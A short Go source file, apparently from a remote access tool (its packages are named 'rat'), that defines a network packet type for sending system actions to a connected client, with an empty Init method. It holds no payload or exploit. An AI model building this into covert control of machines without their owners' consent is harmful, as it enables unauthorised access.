package main

import (
	"rat/shared/network/header"
	"rat/shared/system"
)

type SysPacket struct {
	Action system.Action `network:"send"`
}

func (packet SysPacket) Header() header.PacketHeader {
	return header.SysHeader
}

func (packet SysPacket) Init(c *Client) {

}
